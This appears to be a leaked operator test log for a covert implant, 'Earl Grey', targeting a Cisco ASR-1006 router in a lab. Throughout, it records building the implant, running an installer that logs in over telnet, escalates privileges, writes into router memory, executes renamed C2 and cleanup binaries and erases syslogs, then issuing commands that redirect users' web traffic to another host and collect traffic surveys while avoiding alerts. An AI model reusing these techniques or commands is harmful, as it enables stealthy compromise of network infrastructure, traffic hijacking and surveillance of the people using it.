+Browse from Seed host on Office network to webhost on ISP (XX.XX.X.XXX (HURRICANE-9[US]))
+Unable to get this scenario to work. Tried redir to two other outside servers. Turning rule off allows normal browsing, however. Sent User #73294/User #73295 .pcap of 100.100.40.3 as it was seeing SYNFlag in TCP/IP Protocol packets but not sending anything back. Also sent them text of console messages that were popping up everytime a redir rule was put in place or that it ended.
+
+
+
+
+
+10/28 - In lieu of situation with the redirection issue, will test Slurp-Slurp bugout 
+Send health check trigger to implant: root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -n = successfuly check
+Issue "show tech" on ASR, wait for it to finish output and give implant a minute to uninstall.
+Send another health check trigger, which does not receive a response since EGEarl Grey (Project name) has uninstalled.
+
+
+With EGEarl Grey (Project name) not installed on target, set delay to target to 1200ms on FLX4.
+Install fails at 10% upload while trying to upload through 1200ms delay.
+Decreased delay back to 800ms.
+Install was very slow, but completed successfully. Ran a health check beacon afterwards and it was successful also.
+
+
+
+With EGEarl Grey (Project name) installed on target, make a new release and try to implant target again
+
+Make a new release from eg-build and transfer to ICON1 VM
+Ran attack from ICON:root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log101 c2_manager clear_exp_history
+
+
+New Build - v1.0.2
+
+Placed new release .zip on 10.9.8.21/share/JQJ...
+From ICON1: scp earl-grey-1.0.2.zip eg-build@172.20.12.105:/home/eg-build
+
+Edit /home/eg-build/earl_grey_v1.0.2/common/config.h
+vi config.h 
+
+LP_DEFAULT_IMPLANT_PORT 8080
+LP_DEFAULT_DAEMON_PORT 4444
+LP_HOST1 "XX.XX.X.XXX (HURRICANE-9[US])"
+LP_HOST2 "XX.XX.X.XXX (HURRICANE-9[US])"
+LP_HOST3 "XX.XX.X.XXX (HURRICANE-9[US])"
+
+
+
+
+cd ../implant
+
+make clean release
+ls -l ./build/release/
+
+
+From ICON1 (Move build from eg-build VMVirtual Machine to ICON1 VMVirtual Machine)
+Without changing any modules: Interface card in SIPSession Initiation Protocol (Internet Telephony) 0/0, 0/1, 0/3 (none in SIPSession Initiation Protocol (Internet Telephony) 0/2)
+root@debian:/home/user1# scp -rp root@172.20.12.105:/home/eg-build/earl-grey-1.0.2/build/release /home/user1
+root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log101 c2_manager clear_exp_history
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -nUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonImplant Health Status: Uptime: 1288 seconds Redir: Not Running Survey: Not Runningroot@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.XXX (HURRICANE-9[US]),dprt=80,rip=100.100.40.3,p=3,time=1200,l=redir_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310300Source Mask: 0xffffff00Dest IP: 0x41310564Dest Port: 80Redir IP: 0x64642803Protocol: 3Enabled Time: 1200Local filepath: redir_moduleImplant Health Status: Uptime: 1308 seconds Redir: Not Running Survey: Not Runningredir_module-modifie 100% |*****************************| 1692 B Success
+After nearly 3 minutes, the host was directed from XX.XX.X.XXX (HURRICANE-9[US]) to 100.100.40.3
+
+
+Delay set to 2000ms on FLX4. Issue healthcheck command and received successful response.
+Redirection working fine at 2000ms delay.
+Started survey at 2000ms delay 
+
+
+
+10/30 - Redundancy / Forced RP switch over.
+
+
+Issued health check to target = successful
+Installed second RP supervisor card = successfully recognized
+Issued 2nd health check to target = successful
+ASR-1006#redundancy force-switchover
+Proceed with switchover to standby RP? [confirm]
+VM hosts behind ASRAzure Site Recovery lost connectivity for about 30 seconds and then regained connectivity.
+Issued health check command to target and was UNSUCCESSFUL
+Spoke with User #73294 and he confirmed that they will not survive an RP failover
+No evidence on console, logging, or SNMPSimple Network Management Protocol server of EGEarl Grey (Project name) uninstalling or causing errors during switchover
+
+Installed on target again... this time installing to RP2 since it's the primary RP now = successHealth check comes back successfull as well
+
+Started redir rule: root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.XXX (HURRICANE-9[US]),dprt=80,rip=100.100.40.3,p=3,time=1200,l=redir_module"Redirection working as expected
+
+
+ASR-1006#redundancy force-switchover
+Per User #73294... the expected behavior is that the original redir timer will have to expire plus an additional 40 minutes...After the alloted time, the redir rule expired as expected.
+
+After redir rule was expired, tried to reinstall on target:
+root@debian:/home/user1/release# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now iuetzcjz (0aba1063f33d9bab3c5f3219d6cce47b) clear_exp_history is now gedomnoq (3d6b2fef807b2c2eeb2d3eea18a8ec91)[+] iuetzcjz.tar.gz size: 34114 bytes[+] gedomnoq.tar.gz size: 2274 bytes[+] Logging into ASR-1006 as 'cisco@XX.XX.X.XX (HURRICANE-9[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x3128FFD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP activeGet prompt failed
+Install failed.... tried 2nd time... install failed 2nd time.
+
+
+Rebooted ASR1006 and was able to reinstall on target successfully.
+
+
+November 2
+With NO modules running... forced switchover to RP2
+Reinstalled on target ASR1006 (RP2) ... Install successful, health check successful
+With NO modules running... forced switch over back to RP1
+Reinstalled on target ASR1006 (RP1).... Install fails at same place as before.--- Upload 100% complete ---[+] Getting root terminal on RP activeGet prompt failed
+
+
+Rebooted ASR.... installed on RP1
+failed over to RP2 (did not reinstall on RP2)
+failed back to RP1 and tried to reinstall = ok
+failed over to RP2 again and tried to reinstall = [-] Failed to get a terminal on the FP. Won't clean up syslogs[+] Cleaning up files on RP-activeFailed to return to the en prompt.root@debian:/home/user1/release#
+
+
+Console showed:ASR-1006#Nov 2 13:34:44.296 R1/0: %PMAN-3-PROCHOLDDOWN: The process linux_iosd-image has been helddown (rc 133) Nov 2 13:34:44.380 R1/0: %PMAN-0-PROCFAILCRIT: A critical process linux_iosd_image has failed (rc 133) Nov 2 13:34:44.500 R1/0: %PMAN-3-RELOAD_SYSTEM: Reloading: Other RP is not standby ready. System will be reloaded Nov 2 13:34:59.700 R1/0: %PMAN-5-EXITACTION: Process manager is exiting: critical process fault, linux_iosd_image, rp_1_0, rc=133
+
+RP2 seemed to have failed during install and rebooted the whole box since it said that RP1 was not standby ready
+After reboot, tried to reinstall to RP1 = okhealth check = ok
+
+Failed over to RP2, waited for RP1 to be in a "STANDY HOT" state. Failed RP2 over...RP1 came up fine
+
+
+Installed fresh with 1000ms delay = ok (Install took approximately 25 minutes to complete)
+
+
+
+November 3Ran cables for Ixia connections 0-3 on Ixia down to patch panel in Rack 5. Initial engineeering of Ixia connections. Added BGP Customer#1 router to run one line into as well.
+
+
+November 4-5 Configuration/Setup of Ixia 
+Ixia testing to try and mimic taget load from most recent config: CPU utilization for five seconds: 2%/1%; one minute: 3%; five minutes: 3%Was finally able to create an Ixia test profile that came close to these numbers. Since the majority of the traffic is routed at the card level in the test environment and the target environment. Very little traffic CPU usage is used.
+
+
+Set 30 minute Ixia test run, 900ms delay on Flx4, Started install to (freshly rebooted) ASRAzure Site Recovery Target:Install completed successfully. Health check run several times successfully.
+
+Under same circumstances (Ixia running, 900ms delay) ran survey modules:
+root@debian:/home/user1/release# ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -s "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.X (HURRICANE-9[US])\16,dprt=80,p=3,fields=11111,time=800,l=survey_module"
+./lp -T XX.XX.X.XX (HURRICANE-9[US]) -a l=./survey.logUsing loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonLocal filepath: ./survey.logImplant Health Status: Uptime: 2774 seconds Redir: Not Running Survey: Not Runningfile 100% |*****************************| 479 KB Success
+Survey completes/downloads successfully and is able to be viewed as a spreadsheet.
+
+
+Under same environmental circumstances, started a redir module:
+./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\24,dip=XX.XX.X.XXX (HURRICANE-9[US]),dprt=80,rip=100.100.40.3,p=3,time=1200,l=redir_module"Using loop-back address to connect to server daemonUsing default port, 4444, to connect to server daemonSource IP: 0x41310300Source Mask: 0xffffff00Dest IP: 0x41310564Dest Port: 80Redir IP: 0x64642803Protocol: 3Enabled Time: 1200Local filepath: redir_moduleImplant Health Status: Uptime: 3510 seconds Redir: Not Running Survey: Not Runningredir_module-modifie 100% |*****************************| 1692 B Success
+Confirmed that redir is working from XX.XX.X.X (HURRICANE-9[US])/24 subnet. Redir not redirecting on XX.XX.X.X (HURRICANE-9[US])/24 subnet as expected.
+After redir time expired, targeted subnet reverted to correct webpage.
+Health check completes successfully.
+
+
+
+November 9 Ixia and failover testing:
+Various testing with Ixia traffic running and starting modules, doing health checks, and pulling back surveys (without switchovers).All testing has been solid with 900ms delay and 1200ms delay
+
+Spoke with User #73294 - will test switchover without being logged in via telnet to either RP
+Also will confirm "sh version" and "sh redundancy switchover history" commands either match or don't
+With EGEarl Grey (Project name) installed, issued "redundancy force-switchover" command from RP1 console
+Waited for RP2 to fully come up and for RP1 to fully reload itself...
+RP2 active / RP1 now on "hot standby"
+Did NOT/NOT reinstall to RP2
+From RP2 console:
+ASR-1006#sh redundancy switchover history Index Previous Current Switchover Switchover active active reason time ----- -------- ------- ---------- ---------- 1 48 49 user forced 12:04:22 ESTEastern Standard Time Mon Nov 9 2015
+ASR-1006#sh ver ................software. ROM: IOS-XE ROMMONRead-Only Memory Monitor Cisco bootstrap program ASR-1006 uptime is 3 days, 5 hours, 6 minutes Uptime for this control processor is 3 days, 5 hours, 6 minutes
+NOTE: The switchover shows that it switched over today at 12:03. However, the "sh ver" output shows the "control processor" has been up for 3 days.
+
+
+Switchover back to RP1 via RP2 console...again waited for RP1 to fully load and RP2 to reload back to "hot standby"
+Reinstalled to RP1: python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history
+
+ASR-1006#sh redundancy switchover history Index Previous Current Switchover Switchover active active reason time ----- -------- ------- ---------- ---------- 1 48 49 user forced 12:04:22 ESTEastern Standard Time Mon Nov 9 2015 2 49 48 user forced 12:26:28 ESTEastern Standard Time Mon Nov 9 2015
+"sh ver" = Uptime for this control processor is 48 minutes
+
+
+== There seems to be some inconsistancy of the uptime for a control processor since now it shows 48 minutes on the 2nd failover back to RP1 and it did not show similar info when switched over to RP2.
+What I conclude is that both control processors are "up" for the total time, but if a switchover happens to RP2, then the info procided is indeed true since RP2 has been up in "hot standby" for that amount of time. So, a switchover may occur to RP2 and not realize it by a "sh ver".
+
+Forced switchover back to RP2
+Waited till RP1 was back to "standby HOT"
+ASR-1006 uptime is 3 days, 6 hours, 28 minutes Uptime for this control processor is 1 hour, 17 minutes System returned to ROMRead-Only Memory by SSOSingle Sign On Switchover at 12:26:33 ESTEastern Standard Time Mon Nov 9 2015
+Installed back to RP2 = successful
+ASR-1006 uptime is 3 days, 6 hours, 39 minutes Uptime for this control processor is 31 minutes System returned to ROMRead-Only Memory by SSOSingle Sign On Switchover at 13:14:18 ESTEastern Standard Time Mon Nov 9 2015 System restarted at 13:28:17 ESTEastern Standard Time Mon Nov 9 2015
+
+
+Forced switchover back to RP1
+Installed to RP1: python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history
+
+Successful install again. No failures to install when I am not telnet'd into RP1
+
+
+
+
+
+November 10:
+EG still installed on target (RP1) and returning health checks successfully.
+No alerting console or SNMPSimple Network Management Protocol messages
+Failed over to RP2, waited for RP1 to come back to "hot standby", was not logged into telnet on the target.... however, the install failed as it had in the past saying that the "get prompt failed".
+Gave some time to the target to makde sure all sessions had timed out...exited out of RP2 console.
+Waited at least 30 minutes as this is the time-out setting on the console and vty line on target. Tried to reinstall..... same error.
+Logged in then out of console at 0850. Unable to log into vty since it's failed over to RP2.
+Waited 35 minutes after last install/login attempt and tried to reinstall on target = successfull install and successfull health check
+
+
+
+November 13 - Ixia stress test, etc
+
+Have Ixia run traffic to inside web host and set up redirect rule to direct traffic back out of the network... then listen on port 80 of the internal host to make sure it does NOT receive port 80 traffic = successTurned off redir rule on EGEarl Grey (Project name) = traffice returned to the internal web host
+
+(With Ixia traffic) Tried to reproduce bug where errors were printing to the console by repeatidly uploading modules and doing health checks. Was unable to make anything print to the console with this method.
+Tried to re-create issue where logs print to console.... After 30 minutes of sending modules, force quiting modules, uninstalling, reinstalling, sending more modules, etc... I got the ASRAzure Site Recovery to crash. Once it came back up, I was not installed and had to reinstall. Upon reinstallation, I got similar console messages as before, but only two.
+Nov 13 13:54:12.741 EST: %CPPHA-3-FAULT: F0: cpp_ha: CPP:0 desc:INFP_INF_SWASSIST_LEAF_INT_INT_EVENT0 det:DRVR(interrupt) class:OTHER sev:FATAL id:2121 cppstate:RUNNING res:UNKNOWN flags:0x7 cdmflags:0x8 Nov 13 13:54:12.742 EST: %CPPHA-3-FAULTCRASH: F0: cpp_ha: CPP 0 unresolved fault detected, initiating crash dump. Nov 13 13:54:12.743 EST: %CPPHA-3-FAULTCRASH: F0: cpp_ha: CPP 0 unresolved fault detected, initiating crash dump. Nov 13 13:54:12.745 EST: %CPPDRV-6-INTR: F0: /tmp/sw/fp/0/0/fp/mount/usr/cpp/bin/cpp_driver[6215]: CPP10(0) Interrupt : 15-Nov-13 13:54:12.735326 UTC-0500:INFP_INF_SWASSIST_LEAF_INT_INT_EVENT0 Nov 13 13:54:13.587 EST: %IOSXE_OIR-6-OFFLINECARD: Card (fp) offline in slot F0 Nov 13 13:54:13.764 EST: %CPPCDM-3-ERROR_NOTIFY: F0: cpp_cdm: QFP 0 thread 54 encountered an error -Traceback= 1#327d8d398d0ec480c1e16fb148b756ab 80414E0D 80198DB1 80199566 8019A0F7 804065B4 82017109 804140E4 804140EE 80020064 80020055 80000000 Nov 13 13:54:15.095 EST: %CPPDRV-3-LOCKDOWN: F0: cpp_cp: CPP10(0) CPP Driver LOCKDOWN due to fatal error. Nov 13 13:54:15.102 EST: %CPPOSLIB-3-ERROR_NOTIFY: F0: cpp_cp: cpp_cp encountered an error -Traceback= 1#89004624497d89b49f8629ba7ee2e512 errmsg:D1AF000+2160 cpp_common_os:D7FF000+BB40 cpp_common_os:D7FF000+B950 cpp_common_os:D7FF000+18E9C cpp_sbs:E5F4000+AB84 cpp_sbs:E5F4000+744C cpp_ipfrag_svr:E732000+E5B8 cpp_ipfrag_svr:E732000+9CA4 cpp_common_os:D7FF000+10A74 cpp_common_os:D7FF000+110AC evlib:D578000+D8A4 evlib:D578000+FFC4 cpp_common_os:D7FF000+127C8 :10000000+4240 c:AFC2000+1E938 c:AFC2000+1EAE0......
+Nov 13 13:56:54.959 EST: %OSPF-5-ADJCHG: Process 63, Nbr XX.XX.X.XXX (HURRICANE-9[US]) on TenGigabitEthernet0/3/0.1 from LOADING to FULL, Loading Done Nov 13 13:56:56.022 EST: %BGP-5-ADJCHANGE: neighbor XX.XX.X.XXX (HURRICANE-9[US]) Up Nov 13 13:57:00.119 EST: %BGP-5-ADJCHANGE: neighbor XXX.XXX.XXX.XX (BLT-2[US]) Up Nov 13 13:57:01.784 EST: %BGP-5-ADJCHANGE: neighbor XXX.XX.XXX.XX (ORACLE-AT[US]) Up 
+ASR-1006# 
+ASR-1006# 
+ASR-1006# 
+Nov 13 14:03:37.116 EST: %IOSXE-5-PLATFORM: F0: %SYSTEM-3-SYSTEM_SHELL_LOG: 2015/11/13 14:03:36 : <anon> 
+Nov 13 14:04:10.827 EST: %IOSXE-5-PLATFORM: F0: %SYSTEM-3-SYSTEM_SHELL_LOG: 2015/11/13 14:04:09 : <anon>
+
+
+
+
+
+November 23 - Received v1.0.3 and placed it on EG-build VM
+
+Ran Xtensa command from /earl-grey-1.0.3/implant/qfp
+copied config settings to config.h for target specific settings
+make clean release - then copied relase folder to ICON
+reloaded ASR, reconfigured Flux nodes to facilitate install/comms to target
+Ran EGEarl Grey (Project name) install on ASRAzure Site Recovery target = installed successfully
+Ran health check = comes back successful
+Ran simple redirection without Ixia = ran successful
+Force quit the redir module
+Started full complement of IXIA traffic and ran the previous redir rule successfully
+Started a survey during the same IXIA test = successfully collected large survey of IXIA traffic
+
+
+
+Since December 1 to December 4
+
+Moved "Internet" link to G0/2/1 from Ten0/1/0... this ended up breaking redirection due to hook points on the interfaces
+
+User #73294 developed a patch for 1.0.3 which was confirmed to fix the issue.... he will roll it into a 1.0.4 version for me to test soon
+Updated the opertator who has concerns about having to check interface hook points on target. However, User #73294 did say there was a way to run IOSApple operating system for small devices commands via EGEarl Grey (Project name) to check hook points on actual target interfaces.
+
+
+
+12/4 - Received v1.0.4
+
+Copied earl-grey_v1.0.4.zip over to EGEarl Grey (Project name) builder VM
+Ran: ln -s /opt/xtensa-toolchain-root/ xtensa-toolchain-root
+Unzipped EG
+Ran Xtensa command from /earl-grey-1.0.4/implant/qfp
+configured .conf file as was done previously.... did a "make clean release" and copied release folder over to ICON
+Successfully installed on target ASR-1006
+Health check completed successfully.
+Uploaded redir rule:  ./lp -T XX.XX.X.XX (HURRICANE-9[US]) -r "sip=XX.XX.X.X (HURRICANE-9[US])\16,dip=XX.XX.X.XXX (HURRICANE-9[US]),dprt=80,rip=100.100.40.3,p=3,time=1500,l=redir_module"Redirection works properly!
+
+Started IXIA traffic test.... redir rule still working as expected
+
+
+
+
+
+12/8 - 12/9 Survey testing
+
+All previous survey senarios still work correctly while Ixia traffic is running.
+Installed on top of the implant that's already installed.... install completes successfully on top of previous install - health check comes back normal.
+
+
+
+Test install under 500ms delay with 5% random loss:Placed rule on FLX-4:
+root@flux-04:/home/ubuntu# tc qdisc add dev eth0 root netem delay 900ms loss random 05Install says it completes successfully.... however, health check fails and SNMPSimple Network Management Protocol trap gets sent
+
+Ran install with 500ms delay and loss of 5%Install and health check successful
+
+
+
+
+
+12/11 - Further RP failover testing for 1.0.4
+
+Performed health check and confirmed EGEarl Grey (Project name) is installed and functioning
+Issued the following on the ASR: test diagnostic simulation random-failure slot R0 test 1
+Console messages confirm that ASRAzure Site Recovery is going through simulated failure testinging on RP1 that's in slot R0
+Issued health checks while this was running and they returned successfully
+Test passed according to: show diagnostic slot R0 detail
+
+
+Issued another test: ASR-1006#test interfaces gigabitEthernet 0/2/1!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Passed1 interfaces: 1 passed, 0 failed, 0 skipped, 0 untestable
+
+EG health checks still come back successfully
+Issued: redundancy force-switchover on RP1 of the ASR-1006
+
+Reinstalled on RP2 (Still with 500ms delay and 5% loss)
+Failed once and restarted install....
+Failed twice ...and turned off delay/loss...reinstalled for a third time...
+Failed third time with "get prompt failed" which from previous experience means that VTY lines are occupied and must time out...(30 mins as conigured)
+
+12/14 - Let it sit over the weekend to clear any vty lines and it's still failing on install (Get prompt failed) - (No telnet sessions open, only consoles at carrot prompt)
+Rebooted ASRAzure Site Recovery (while on RP2 as active)...
+Reboots and brings up RP1
+Reinstalled on RP1 without delay/loss = success
+
+
+Issued: redundancy force-switchover on RP1 of the ASR-1006 (trying previous test without delay/loss during install)
+Waited for all neighbors to come back up... FLXFluxwire nodes unchanged and up...
+Reinstalled to RP2 (no delay/loss) = Get Prompt Failed
+Sent install log file and Falcon email to User #73294 describing the issue
+Waited until RP1 fully rebooted and came up to hot standby and installed again = successful install then
+
+
+
+Stress testing: Playing angry teenager and starting modules, canceling modules, health checks, starting new modules, canceling modules over and over..(with IXIA running traffic at the same time)
+
+
+
+12/17 - Successful install on target, but failed to gain a terminal on the FP (Won't clean up syslogs)
+
+
+After looking up how to fail over a SPA (FP) card, I was able to reproduce the result we got from the target:
+Issue "Show Platform" on the ASRAzure Site Recovery and observe that F0 is active and that F1 is "ok, standby"
+Issue "redundancy force-switchover fp"Cisco states that there will be less than 200ms delay in the second FP card coming online and continuing to forward traffic
+
+Issue "Show Platform" again and F1 will be "ok, active" and F0 will show that it's in the process of restarting.
+
+Run install from ICON and observe the following reproduction of the result on target:root@debian:/home/user1/release_v1.0.4# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) cisco cisco password ASR-1006 ./test_log c2_manager clear_exp_history== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now qiwgrtkx (e7ad494482d954af9fd971eeee0a4252) clear_exp_history is now vsxkrefw (5b1ef76094fc92fbd67213f24ab95e10)[+] qiwgrtkx.tar.gz size: 34151 bytes[+] vsxkrefw.tar.gz size: 2267 bytes[+] Logging into ASR-1006 as 'cisco@XX.XX.X.XX (HURRICANE-9[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x31247FD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP active[+] Uploading qiwgrtkx.tar.gz to the RP--- Upload 100% complete ---[+] Decompressing the c2 package[+] md5sum /tmp/qiwgrtkx: e7ad494482d954af9fd971eeee0a4252[+] Executing qiwgrtkx[+] Getting root terminal on SIP[+] Uploading vsxkrefw.tar.gz to the SIP--- Upload 100% complete ---[+] Decompressing the cleanup package[+] md5sum /tmp/vsxkrefw: 5b1ef76094fc92fbd67213f24ab95e10[+] Executing vsxkrefw[+] Cleaning up files on SIP[+] Getting a terminal on FP[-] Failed to get a terminal on the FP. Won't clean up syslogs[+] Cleaning up files on RP-active[+] Exploit completed successfullyroot@debian:/home/user1/release_v1.0.4#
+
+Started a redir module and did receive a syslog/console print message:Dec 17 10:38:33.462 EST: %IOSXE-5-PLATFORM: F0: %SYSTEM-3-SYSTEM_SHELL_LOG: 2015/12/17 10:38:32 : <anon>
+
+I seem to have also gotten additional messages when module started/stopped:
+ASR-1006# Dec 17 10:42:32.159 EST: %EVENTLIB-3-TIMEHOG: F0: cpp_cp: undefined: 100012ms, Traceback=1#89004624497d89b49f8629ba7ee2e512 evlib:D578000+D170 evlib:D578000+A888 cpp_common_os:D7FF000+14A60 evlib:D578000+D8A4 evlib:D578000+FFC4 cpp_common_os:D7FF000+127C8 :10000000+4240 c:AFC2000+1E938 c:AFC2000+1EAE0 Dec 17 10:42:32.175 EST: %EVENTLIB-3-TIMEHOG: F0: fman_fp_image: undefined: 100021ms, Traceback=1#b90dcf429701157e2fbf194f2d3c0eeb evlib:B025000+D170 evlib:B025000+C0D8 :10000000+2BE514 :10000000+2A5328 :10000000+1A450C :10000000+435794 cpp_platform_ha:9E7B000+3044 cpp_common_os:A774000+10A74 cpp_common_os:A774000+110AC evlib:B025000+D8A4 evlib:B025000+FFC4 :10000000+1A53D4 Dec 17 10:42:32.176 EST: %EVENTLIB-3-HISTSUMM: F0: fman_fp_image: dispatch start: 1162539ms elapsed time: 100037ms detected hog: 0 set count: 0
+Dec 17 10:42:32.181 EST: %EVENTLIB-3-HISTSUMM: F0: cpp_cp: dispatch start: 1162540ms elapsed time: 100040ms detected hog: 1 set count: 1 Dec 17 10:42:32.181 EST: %EVENTLIB-3-HISTELEM: F0: cpp_cp: elem[1] event: Unset -> HOG set: 1162540ms unset: 1262552ms hog check: -1 caller: 0xd80fa54 app-info: SMC comp_id(0x0036) msgno(12) rx_sync_count(246) Dec 17 10:42:33.493 EST: %IOSXE-5-PLATFORM: F0: %SYSTEM-3-SYSTEM_SHELL_LOG: 2015/12/17 10:42:32 : <anon> Dec 17 10:46:32.169 EST: %EVENTLIB-3-TIMEHOG: F0: cpp_cp: undefined: 100002ms, Traceback=1#89004624497d89b49f8629ba7ee2e512 evlib:D578000+D170 evlib:D578000+C0D8 cpp_palci_svr_lib:DEE8000+7514 cpp_palci_svr_lib:DEE8000+68BC cpp_client_ha:E0F3000+2E58 cpp_common_os:D7FF000+10A74 cpp_common_os:D7FF000+110AC evlib:D578000+D8A4 evlib:D578000+FFC4 cpp_common_os:D7FF000+127C8 :10000000+4240 c:AFC2000+1E938 Dec 17 10:46:32.169 EST: %EVENTLIB-3-HISTSUMM: F0: cpp_cp: dispatch start: 1402562ms elapsed time: 100006ms detected hog: 0 set count: 0 Dec 17 10:46:32.178 EST: %EVENTLIB-3-TIMEHOG: F0: fman_fp_image: undefined: 100005ms, Traceback=1#b90dcf429701157e2fbf194f2d3c0eeb evlib:B025000+D170 evlib:B025000+C0D8 :10000000+2BE514 :10000000+2A5328 :10000000+1A450C :10000000+435794 cpp_platform_ha:9E7B000+3044 cpp_common_os:A774000+10A74 cpp_common_os:A774000+110AC evlib:B025000+D8A4 evlib:B025000+FFC4 :10000000+1A53D4 Dec 17 10:46:32.178 EST: %EVENTLIB-3-HISTSUMM: F0: fman_fp_image: dispatch start: 1402567ms elapsed time: 100011ms detected hog: 0 set count: 0
+
+
+Uninstalled from target with -x and received the following log:Dec 17 10:55:30.475 EST: %IOSXE-5-PLATFORM: F1: %SYSTEM-3-SYSTEM_SHELL_LOG: 2015/12/17 10:55:29 : <anon>
+
+
+
+
+12/21 - Tested various ways of entering username / password / enable password to install on target (actual target has long and complicated password without a username set up):
+Examples include the following which ad quotes to the password and enable secret password in different combinations:
+root@debian:/home/user1/release_v1.0.4# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser "cisco" "password" ASR-1006 ./test_log c2_manager clear_exp_history
+root@debian:/home/user1/release_v1.0.4# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser cisco password ASR-1006 ./test_log c2_manager clear_exp_history
+root@debian:/home/user1/release_v1.0.4# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser cisco "password" ASR-1006 ./test_log c2_manager clear_exp_history
+All installed successfully
+
+
+
+
+12/22 Received bug patch 717 to v1.0.4
+Placed patch on build VM, configured target settings and made new clean release
+
+
+12/28 Initial install and testing of 1.0.4 717 patch
+
+ With RP1 and F1 active (as was on actual target), installed EGEarl Grey (Project name) successfully:
+
+root@debian:/home/user1/release_v1.0.4.patch# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser "cisco" password ASR-1006 ./test_log c2_manager clear_exp_history== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now ajjwnbsz (ea8211bf431ba41609dabbb13d433d2d) clear_exp_history is now oztbrgje (4f5408264298e529dbdefe5eb3b0bd1b)[+] ajjwnbsz.tar.gz size: 35157 bytes[+] oztbrgje.tar.gz size: 2260 bytes[+] Logging into ASR-1006 as 'baduser@XX.XX.X.XX (HURRICANE-9[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x3127DFD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP active[+] Uploading ajjwnbsz.tar.gz to the RP--- Upload 100% complete ---[+] Decompressing the c2 package[+] md5sum /tmp/ajjwnbsz: ea8211bf431ba41609dabbb13d433d2d[+] Executing ajjwnbsz[+] Getting root terminal on SIP[+] Uploading oztbrgje.tar.gz to the SIP--- Upload 100% complete ---[+] Decompressing the cleanup package[+] md5sum /tmp/oztbrgje: 4f5408264298e529dbdefe5eb3b0bd1b[+] Executing oztbrgje[+] Cleaning up files on SIP[+] Cleaning up files on RP-active[+] Exploit completed successfully
+No syslogs, console prints, or SNMPSimple Network Management Protocol traps after install
+Forced switchover of ESP from F1 to F0No abnormal syslog messages or SNMPSimple Network Management Protocol traps
+
+Health checks come back successfully
+
+
+Installed on RP1 and F0.... then forced switchover to F1
+No abnormal syslog or SNMPSimple Network Management Protocol messages
+Health checks come back susccessful
+
+
+
+
+
+12/29 - Received full release v1.0.5
+
+Unzipped package on build VM, ran Xtensa command, copied config.h from previous release, and issued a "make clean release" to build a new package
+Copied new release directory to ICON VM
+
+Ran installation on target with R0 and F1 as the active cards:root@debian:/home/user1/release_v1.0.5# python earlgrey_installer.py XX.XX.X.XX (HURRICANE-9[US]) baduser "cisco" password ASR-1006 ./test_log c2_manager clear_exp_history== Exploit version 30502 ==[+] Generating random names for the c2 and clear sip history binaries c2_manager is now xpymiafw (248c89edebe38e504e0775e9baa113f7) clear_exp_history is now czdxeqta (de987f0cc31050fe12bdca61e080a252)[+] xpymiafw.tar.gz size: 35125 bytes[+] czdxeqta.tar.gz size: 2256 bytes[+] Logging into ASR-1006 as 'baduser@XX.XX.X.XX (HURRICANE-9[US])' via telnet[+] Escalating privileges[+] Dropping down into SIPSession Initiation Protocol (Internet Telephony) console[+] Computing offsets for writing into SIPSession Initiation Protocol (Internet Telephony) memory[+] Write location: 0x3127DFD0[+] Uploading and executing sh code to overwrite .sh files--- Upload 100% complete ---[+] Getting root terminal on RP active[+] Uploading xpymiafw.tar.gz to the RP--- Upload 100% complete ---[+] Decompressing the c2 package[+] md5sum /tmp/xpymiafw: 248c89edebe38e504e0775e9baa113f7[+] Executing xpymiafw[+] Getting root terminal on SIP[+] Uploading czdxeqta.tar.gz to the SIP--- Upload 100% complete 